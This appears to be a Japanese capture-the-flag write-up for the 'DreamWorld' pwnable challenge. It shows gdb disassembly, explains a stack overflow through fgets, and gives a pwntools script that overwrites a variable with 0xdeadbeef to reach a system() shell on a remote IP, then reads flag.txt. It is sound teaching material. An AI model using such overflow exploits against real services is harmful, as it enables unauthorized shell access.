# nag0m1CTF

https://nag0mictf.tk

## pwnable

### DreamWorld

> My world is very beautiful. I want to conversation with you. Let's have a nice conversation before I break down.
> 
> nc 3.18.62.210 11001

ひとまずnetcatして接続してみます．

```
> echo "Hello world!" | nc 3.18.62.210 11001
Welcome to my world!
Have fun!
Bye.
```

それでは，たくさんの文字列を送信してみます．

```
> echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc 3.18.62.210 11001
Welcome to my world!
Bye.
```

`Have fun!`の文字が消えたようです．

このことから，オーバーフローによって条件式の内容が変化しているようです．

<br>

ここで，**gdb**というツールを使用してみます．

これはデバッガーツールとなっており，breakpointをはったり，逆アセンブルをしたりすることができます．

pwnableを解くにあたって非常に重要となるツールです．

<br>

ひとまずgdbを使用して逆アセンブルしてみます．

```
> gdb DreamWorld
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x000000000040073b <+0>:     push   rbp
   0x000000000040073c <+1>:     mov    rbp,rsp
   0x000000000040073f <+4>:     sub    rsp,0x30
   0x0000000000400743 <+8>:     mov    QWORD PTR [rbp-0x30],0x0
   0x000000000040074b <+16>:    mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000400753 <+24>:    mov    QWORD PTR [rbp-0x20],0x0
   0x000000000040075b <+32>:    mov    QWORD PTR [rbp-0x18],0x0
   0x0000000000400763 <+40>:    mov    DWORD PTR [rbp-0x4],0x0
   0x000000000040076a <+47>:    call   0x4006c7 <setup>
   0x000000000040076f <+52>:    lea    rdi,[rip+0xf6]        # 0x40086c
   0x0000000000400776 <+59>:    call   0x400590 <puts@plt>
   0x000000000040077b <+64>:    mov    rdx,QWORD PTR [rip+0x2008ee]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x0000000000400782 <+71>:    lea    rax,[rbp-0x30]
   0x0000000000400786 <+75>:    mov    esi,0x40
   0x000000000040078b <+80>:    mov    rdi,rax
   0x000000000040078e <+83>:    call   0x4005b0 <fgets@plt>
   0x0000000000400793 <+88>:    cmp    DWORD PTR [rbp-0x4],0x0
   0x0000000000400797 <+92>:    jne    0x4007a5 <main+106>
   0x0000000000400799 <+94>:    lea    rdi,[rip+0xe1]        # 0x400881
   0x00000000004007a0 <+101>:   call   0x400590 <puts@plt>
   0x00000000004007a5 <+106>:   cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x00000000004007ac <+113>:   jne    0x4007c1 <main+134>
   0x00000000004007ae <+115>:   lea    rdi,[rip+0xd6]        # 0x40088b
   0x00000000004007b5 <+122>:   call   0x400590 <puts@plt>
   0x00000000004007ba <+127>:   call   0x400728 <win>
   0x00000000004007bf <+132>:   jmp    0x4007d7 <main+156>
   0x00000000004007c1 <+134>:   lea    rdi,[rip+0xd0]        # 0x400898
   0x00000000004007c8 <+141>:   call   0x400590 <puts@plt>
   0x00000000004007cd <+146>:   mov    edi,0xffffffff
   0x00000000004007d2 <+151>:   call   0x4005d0 <exit@plt>
   0x00000000004007d7 <+156>:   leave
   0x00000000004007d8 <+157>:   ret
End of assembler dump.
```

`0x00000000004007ba <+127>:   call   0x400728 <win>`という箇所がwin関数に飛んでいるようですね．

中を見てみましょう．

```
gdb-peda$ disassemble win
Dump of assembler code for function win:
   0x0000000000400728 <+0>:     push   rbp
   0x0000000000400729 <+1>:     mov    rbp,rsp
   0x000000000040072c <+4>:     lea    rdi,[rip+0x131]        # 0x400864
   0x0000000000400733 <+11>:    call   0x4005a0 <system@plt>
   0x0000000000400738 <+16>:    nop
   0x0000000000400739 <+17>:    pop    rbp
   0x000000000040073a <+18>:    ret
End of assembler dump.
```

`0x0000000000400733 <+11>:    call   0x4005a0 <system@plt>`という箇所ですが，この関数はシェルを獲得できるものとなっています．

このことから，win関数に飛ぶことができればシェル獲得できそうだということがわかります．

<br>

シェル獲得をするということは，netcatした先のシェルを奪うことができるということになります．

pwnable問題では，シェルを獲得してフラグを入手するという問題がよくあります．

<br>

ということは，win関数に移動できれば良いということになります．

win関数の移動条件は，main関数にあります．

`0x00000000004007a5 <+106>:   cmp    DWORD PTR [rbp-0x4],0xdeadbeef`というところですね．

rbp-0x4に格納されている値が`0xdeadbeef`のときにwin関数に移動できそうです．

<br>

ここで，値を代入できそうな箇所を探してみると，`0x000000000040078e <+83>:    call   0x4005b0 <fgets@plt>`であることがわかります．

この前の箇所を切り取ってみると，

```
   0x0000000000400782 <+71>:    lea    rax,[rbp-0x30]
   0x0000000000400786 <+75>:    mov    esi,0x40
   0x000000000040078b <+80>:    mov    rdi,rax
   0x000000000040078e <+83>:    call   0x4005b0 <fgets@plt>
```

`lea`という箇所がアドレス計算を表しています．

ここで次のコマンド`0x0000000000400786 <+75>:    mov    esi,0x40`ですが，0x40となっています．

ここで，rbp-0x30のアドレスから0x40分だけ書き込めるということがわかります．

したがって，ここに違和感を感じることだと思います．

<br>

以上のことをあわせると，rbp-0x04に`0xdeadbeef`という単語を入力するために，fgets関数の箇所でrbp-0x30からrbp-0x05までパディングして，rbp-0x04から`0xdeadbeef`を入力することでシェル獲得できそうだと考察できます．

<br>

これを解くにあたって，pythonライブラリである**pwntools**を使用します．

以下が解法例になります．

```
from pwn import *
 
data = b'a' * 0x2c + p64(0xdeadbeef) 

# io = process("./DreamWorld")
io = remote("3.18.62.210", 11001)
print(io.readline())
io.sendline(data)
print(io.readline())
io.interactive()
```

実行したら，シェル獲得できます．

インタラクティブモードに移行するので，`ls`コマンドでディレクトリ確認して，`cat`で`flag.txt`の中身確認したらフラグを入手できます．

```
> python3 DreamWorld.py
[+] Opening connection to 3.18.62.210 on port 11001: Done
b'Welcome to my world!\n'
b'You got it!!\n'
[*] Switching to interactive mode
$ cat flag.txt
nag0m1{7he_w0rld_h4s_br0k3n......}
```

<br>

---
※別解

**ghidra**を用いた解法もあります．

こちらを使用すると逆コンパイルまでできるので理解しやすいと思います．

今回は省略します．
